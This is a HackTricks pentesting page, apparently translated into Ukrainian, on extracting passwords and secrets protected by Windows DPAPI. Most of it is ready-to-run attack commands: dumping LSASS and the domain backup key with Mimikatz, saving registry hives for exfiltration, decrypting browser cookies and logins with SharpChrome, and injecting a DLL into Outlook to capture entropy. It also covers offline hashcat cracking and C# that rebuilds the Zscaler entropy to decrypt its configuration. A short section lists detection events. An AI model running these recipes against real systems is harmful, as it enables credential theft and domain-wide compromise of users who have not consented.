# DPAPI - Extracting Passwords

{{#include ../../banners/hacktricks-training.md}}



## Що таке DPAPI

Data Protection API (DPAPI) переважно використовується в операційній системі Windows для **симетричного шифрування асиметричних приватних ключів**, використовуючи секрети користувача або системи як важливе джерело ентропії. Такий підхід спрощує шифрування для розробників, даючи їм змогу шифрувати дані за допомогою ключа, похідного від секретів входу користувача або, у разі системного шифрування, секретів автентифікації домену системи, усуваючи потребу самостійно керувати захистом ключа шифрування.

Найпоширеніший спосіб використання DPAPI — через функції **`CryptProtectData` та `CryptUnprotectData`**, які дають змогу застосункам безпечно шифрувати та розшифровувати дані в межах сесії поточного авторизованого процесу. Це означає, що зашифровані дані може розшифрувати лише той самий користувач або система, які їх зашифрували.

Крім того, ці функції також приймають параметр **`entropy`**, який використовується під час шифрування та розшифрування. Тому для розшифрування даних, зашифрованих із використанням цього параметра, потрібно надати те саме значення entropy, яке використовувалося під час шифрування.

### Генерація ключа користувача

DPAPI генерує унікальний ключ (так званий **`pre-key`**) для кожного користувача на основі його облікових даних. Цей ключ виводиться з пароля користувача та інших факторів, а алгоритм залежить від типу користувача, але зрештою результатом є SHA1. Наприклад, для доменних користувачів **він залежить від NTLM-хешу користувача**.

Це особливо цікаво, оскільки якщо attacker може отримати хеш пароля користувача, він може:

- **Розшифрувати будь-які дані, зашифровані за допомогою DPAPI**, використовуючи ключ цього користувача, без необхідності звертатися до будь-якого API
- Спробувати **зламати пароль** offline, намагаючись згенерувати правильний ключ DPAPI

Крім того, щоразу, коли користувач шифрує певні дані за допомогою DPAPI, генерується новий **master key**. Саме цей master key фактично використовується для шифрування даних. Кожному master key присвоюється **GUID** (Globally Unique Identifier), який його ідентифікує.

Master keys зберігаються в каталозі **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, де `{SID}` — це Security Identifier цього користувача. Master key зберігається зашифрованим за допомогою **`pre-key`** користувача, а також **domain backup key** для відновлення (тобто той самий ключ зберігається зашифрованим 2 рази за допомогою 2 різних паролів).

Зверніть увагу, що **domain key**, який використовується для шифрування master key, знаходиться на domain controllers і ніколи не змінюється. Тому якщо attacker має доступ до domain controller, він може отримати domain backup key і розшифрувати master keys усіх користувачів у домені.<sup>[[2]](#references)</sup>

Зашифровані blobs містять **GUID master key**, який використовувався для шифрування даних, у своїх заголовках.

> [!TIP]
> Зашифровані DPAPI blobs починаються з **`01 00 00 00`**

Знайти master keys:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
This is what a bunch of Master Keys of a user will looks like:

![Що таке DPAPI — генерація ключів користувача: так виглядає набір Master Keys користувача](<../../images/image (1121).png>)

### Генерація ключа Machine/System

Цей ключ використовується Machine для шифрування даних. Він базується на **DPAPI_SYSTEM LSA secret** — спеціальному ключі, доступ до якого має лише користувач SYSTEM. Цей ключ використовується для шифрування даних, які мають бути доступні самій системі, наприклад облікових даних рівня Machine або загальносистемних секретів.<sup>[[2]](#references)</sup>

Зверніть увагу, що ці ключі **не мають доменної резервної копії**, тому доступні лише локально:

- **Mimikatz** може отримати до них доступ, дампуючи LSA secrets за допомогою команди: `mimikatz lsadump::secrets`
- Секрет зберігається всередині registry, тому адміністратор може **змінити дозволи DACL, щоб отримати до нього доступ**. Шлях у registry: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- Також можливе offline-вилучення з registry hives. Наприклад, будучи адміністратором на цільовій системі, збережіть hives і виконайте їх exfiltration:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
Потім на вашій аналітичній машині відновіть секрет LSA DPAPI_SYSTEM із hive-файлів і використайте його для розшифрування blobs машинної області (паролі запланованих завдань, облікові дані служб, профілі Wi‑Fi тощо):
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
### Дані, захищені DPAPI

До персональних даних, захищених DPAPI, належать:

- Windows creds
- Паролі та дані автозаповнення Internet Explorer і Google Chrome
- Паролі облікових записів електронної пошти та внутрішніх FTP для таких застосунків, як Outlook і Windows Mail
- Паролі для спільних папок, ресурсів, бездротових мереж і Windows Vault, включно з ключами шифрування
- Паролі для підключень до віддаленого робочого столу, .NET Passport і приватні ключі для різних цілей шифрування та автентифікації
- Мережеві паролі, якими керує Credential Manager, і персональні дані в застосунках, що використовують CryptProtectData, таких як Skype, MSN messenger тощо
- Зашифровані blobs у реєстрі
- ...

До системних захищених даних належать:
- Паролі Wi-Fi
- Паролі Scheduled task
- ...

### Варіанти вилучення master key

- Якщо користувач має привілеї domain admin, він може отримати доступ до **domain backup key**, щоб розшифрувати всі master keys користувачів у домені:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Маючи локальні права адміністратора, можна **отримати доступ до пам’яті LSASS** для вилучення головних ключів DPAPI усіх підключених користувачів і ключа SYSTEM.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Якщо користувач має локальні права адміністратора, він може отримати доступ до **DPAPI_SYSTEM LSA secret**, щоб розшифрувати головні ключі машини:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Якщо пароль або хеш NTLM користувача відомий, можна **безпосередньо розшифрувати головні ключі користувача**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Якщо ви перебуваєте у session як цей user, можна запитати в DC **резервний ключ для розшифрування master keys через RPC**. Якщо ви є local admin, а user увійшов у систему, для цього можна **викрасти його session token**:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Список Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Доступ до зашифрованих даних DPAPI

### Пошук зашифрованих даних DPAPI

Поширені **захищені файли** користувачів розташовані в:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Також перевірте заміну `\Roaming\` на `\Local\` у наведених вище шляхах.

Приклади перерахування:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) може знаходити blobs, зашифровані DPAPI, у файловій системі, реєстрі та B64 blobs:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Зверніть увагу, що [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (з того самого репозиторію) можна використовувати для розшифрування за допомогою DPAPI таких чутливих даних, як cookies.

#### Швидкі рецепти для Chromium/Edge/Electron (SharpChrome)

- Поточний користувач, інтерактивне розшифрування збережених облікових даних/cookies (працює навіть із app-bound cookies у Chrome 127+, оскільки додатковий ключ отримується з Credential Manager користувача під час запуску в контексті користувача):
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- Offline-аналіз, коли у вас є лише файли. Спочатку видобудьте ключ стану AES із "Local State" профілю, а потім використайте його для розшифрування cookie DB:
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- Загальнодоменний/віддалений triage, коли у вас є резервний ключ домену DPAPI (PVK) і права адміністратора на цільовому хості:
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- Якщо у вас є DPAPI prekey/credkey користувача (отриманий з LSASS), ви можете пропустити cracking пароля та безпосередньо розшифрувати дані профілю:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
Примітки
- У новіших збірках Chrome/Edge деякі cookies можуть зберігатися з використанням шифрування "App-Bound". Offline розшифрування саме цих cookies неможливе без додаткового app-bound ключа; запустіть SharpChrome у контексті цільового користувача, щоб автоматично отримати його. Див. публікацію в блозі про безпеку Chrome, на яку наведено посилання нижче.<sup>[[5]](#references)</sup>

### Ключі доступу та дані

- **Використовуйте SharpDPAPI**, щоб отримати облікові дані з DPAPI-зашифрованих файлів поточного сеансу:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Отримайте інформацію про облікові дані**, зокрема зашифровані дані та guidMasterKey.<sup>[[3]](#references)</sup>
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Отримання доступу до masterkeys**:

Розшифрувати masterkey користувача, який запитує **domain backup key**, за допомогою RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Інструмент **SharpDPAPI** також підтримує такі аргументи для розшифрування майстер-ключів (зверніть увагу, що можна використовувати `/rpc`, щоб отримати резервний ключ домену, `/password`, щоб використати пароль у відкритому вигляді, або `/pvk`, щоб указати файл приватного ключа домену DPAPI...):<sup>[[12]](#references)</sup>
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Розшифрувати дані за допомогою masterkey**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Інструмент **SharpDPAPI** також підтримує такі аргументи для розшифрування `credentials|vaults|rdg|keepass|triage|blob|ps` (зверніть увагу, що можна використовувати `/rpc`, щоб отримати резервний ключ домену, `/password`, щоб використати пароль у відкритому вигляді, `/pvk`, щоб указати файл із приватним ключем домену DPAPI, `/unprotect`, щоб використати поточний сеанс користувача...):<sup>[[12]](#references)</sup>
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Безпосереднє використання DPAPI prekey/credkey (пароль не потрібен)

Якщо ви можете виконати dump LSASS, Mimikatz часто розкриває DPAPI key для кожного сеансу входу, який можна використати для розшифрування masterkeys користувача без знання пароля у відкритому вигляді. Передайте це значення безпосередньо інструменту:
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- Розшифрувати деякі дані за допомогою **поточного сеансу користувача**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Offline decryption with Impacket dpapi.py

Якщо у вас є SID і пароль користувача-жертви (або NT hash), ви можете повністю офлайн розшифрувати DPAPI masterkeys і Credential Manager blobs за допомогою Impacket’s dpapi.py.<sup>[[10]](#references)[[11]](#references)</sup>

- Identify artefacts on disk:
- Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
- Matching masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- If file transfer tooling is flaky, base64 the files on-host and copy the output:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- Розшифрувати masterkey за допомогою SID і пароля/хеша користувача:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- Використайте розшифрований masterkey, щоб розшифрувати credential blob:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
Цей workflow часто дозволяє відновити доменні облікові дані, збережені застосунками за допомогою Windows Credential Manager, зокрема облікові записи адміністраторів (наприклад, `*_adm`).

---

### Робота з необов’язковою ентропією ("Third-party entropy")

Деякі застосунки передають додаткове значення **entropy** до `CryptProtectData`. Без цього значення blob неможливо розшифрувати, навіть якщо відомий правильний masterkey. Тому отримання entropy є необхідним під час атак на облікові дані, захищені таким способом (наприклад, Microsoft Outlook і деякі VPN-клієнти).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) — це DLL у user-mode, яка перехоплює функції DPAPI всередині цільового процесу та прозоро записує будь-яку передану optional entropy. Запуск EntropyCapture у режимі **DLL-injection** проти таких процесів, як `outlook.exe` або `vpnclient.exe`, створить файл, що зіставляє кожен entropy buffer із процесом-викликачем і blob. Захоплену entropy згодом можна передати до **SharpDPAPI** (`/entropy:`) або **Mimikatz** (`/entropy:<file>`), щоб розшифрувати дані.<sup>[[6]](#references)</sup>
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Offline cracking masterkeys (Hashcat & DPAPISnoop)

Microsoft introduced a **context 3** format for masterkeys starting with Windows 10 v1607 (2016). `hashcat` v6.2.6 (December 2023) added hash-modes **22100** (DPAPI masterkey v1 context ), **22101** (context 1) and **22102** (context 3), enabling GPU-accelerated cracking of user passwords directly from the masterkey file. Therefore, attackers can perform word-list or brute-force attacks without interacting with the target system.<sup>[[7]](#references)</sup>

`DPAPISnoop` (2024) automates the process:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Інструмент також може аналізувати Credential і Vault blobs, розшифровувати їх за допомогою зламаних ключів і експортувати паролі у відкритому вигляді.<sup>[[8]](#references)</sup>


### Доступ до даних іншої машини

У **SharpDPAPI і SharpChrome** можна вказати опцію **`/server:HOST`**, щоб отримати доступ до даних віддаленої машини. Звісно, необхідно мати можливість доступу до цієї машини, і в наведеному нижче прикладі передбачається, що **domain backup encryption key відомий**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Інші інструменти

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) — це інструмент, який автоматизує вилучення всіх користувачів і комп’ютерів із LDAP-директорії, а також вилучення резервного ключа контролера домену через RPC. Потім скрипт визначає IP-адреси всіх комп’ютерів і виконує smbclient на кожному з них, щоб отримати всі DPAPI blobs усіх користувачів і розшифрувати все за допомогою резервного ключа домену.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

За допомогою списку комп’ютерів, вилученого з LDAP, можна знайти всі підмережі, навіть якщо ви не знали про них!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) може автоматично вилучати секрети, захищені DPAPI. У релізі 2.x додано:<sup>[[9]](#references)</sup>

* Паралельний збір blobs із сотень хостів
* Парсинг **context 3** masterkeys та автоматичну інтеграцію зламування через Hashcat
* Підтримку зашифрованих cookies Chrome "App-Bound" (див. наступний розділ)
* Новий режим **`--snapshot`** для повторного опитування endpoints і виявлення нових blobs

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) — це C#-парсер файлів masterkey/credential/vault, який може виводити формати Hashcat/JtR і за потреби автоматично запускати cracking. Він повністю підтримує формати machine і user masterkey до Windows 11 24H1.<sup>[[8]](#references)</sup>


## Поширені ознаки виявлення

- Доступ до файлів у `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` та інших DPAPI-related директоріях.
- Особливо з мережевої шари, наприклад **C$** або **ADMIN$**.
- Використання **Mimikatz**, **SharpDPAPI** або подібних інструментів для доступу до пам’яті LSASS чи dump masterkeys.
- Подія **4662**: *An operation was performed on an object* — її можна пов’язати з доступом до об’єкта **`BCKUPKEY`**.
- Події **4673/4674**, коли процес запитує *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### Вразливості та зміни в екосистемі у 2023–2025 роках

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (листопад 2023 року). Зловмисник із доступом до мережі міг змусити учасника домену отримати шкідливий резервний ключ DPAPI, що дозволяло розшифрувати user masterkeys. Вразливість виправлено в сукупному оновленні за листопад 2023 року — адміністратори повинні переконатися, що DC і робочі станції повністю оновлені.<sup>[[4]](#references)</sup>
* **Шифрування cookies Chrome 127 “App-Bound”** (липень 2024 року) замінило застарілий захист лише DPAPI додатковим ключем, що зберігається в **Credential Manager** користувача. Для offline-розшифрування cookies тепер потрібні і DPAPI masterkey, і **GCM-wrapped app-bound key**. SharpChrome v2.3 і DonPAPI 2.x можуть отримати додатковий ключ під час роботи в user context.<sup>[[5]](#references)</sup>


### Практичний приклад: Zscaler Client Connector – custom entropy, отримана із SID

Zscaler Client Connector зберігає кілька конфігураційних файлів у `C:\ProgramData\Zscaler` (наприклад, `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Кожен файл зашифровано за допомогою **DPAPI (Machine scope)**, але постачальник використовує **custom entropy**, яка *обчислюється під час виконання* замість зберігання на диску.<sup>[[1]](#references)</sup>

Entropy відновлюється з двох елементів:

1. Жорстко закодованого секрету, вбудованого в `ZSACredentialProvider.dll`.
2. **SID** облікового запису Windows, якому належить конфігурація.

Алгоритм, реалізований DLL, еквівалентний такому:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Оскільки секрет вбудовано в DLL, яку можна прочитати з диска, **будь-який локальний attacker із правами SYSTEM може повторно згенерувати entropy для будь-якого SID** і розшифрувати blobs офлайн:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Розшифрування повертає повну конфігурацію JSON, включно з кожною **перевіркою стану пристрою** та її очікуваним значенням — інформацією, яка є надзвичайно цінною під час спроб виконати client-side bypasses.

> ПОРАДА: інші зашифровані артефакти (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) захищені за допомогою DPAPI **без entropy** (`16` нульових байтів). Тому їх можна безпосередньо розшифрувати за допомогою `ProtectedData.Unprotect` після отримання привілеїв SYSTEM.

## Посилання

- [1] [Synacktiv – Чи варто довіряти вашому zero trust? Обхід перевірок стану пристрою Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [Секрети DPAPI. Аналіз безпеки та відновлення даних у DPAPI](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [Читання зашифрованих секретів DPAPI за допомогою Mimikatz і C++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [4] [CVE-2023-36004 – Уразливість спуфінгу Windows DPAPI (Data Protection Application Programming Interface)](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [Покращення безпеки cookie Chrome у Windows](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture: просте вилучення необов'язкової entropy DPAPI](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [Примітки до випуску hashcat v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop – репозиторій GitHub](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 – сторінка проєкту PyPI](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy: зловживання AD ACL, crack Argon2 KeePassXC та розшифрування DPAPI до отримання прав адміністратора DC](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome – використання та параметри](https://github.com/GhostPack/SharpDPAPI)

{{#include ../../banners/hacktricks-training.md}}
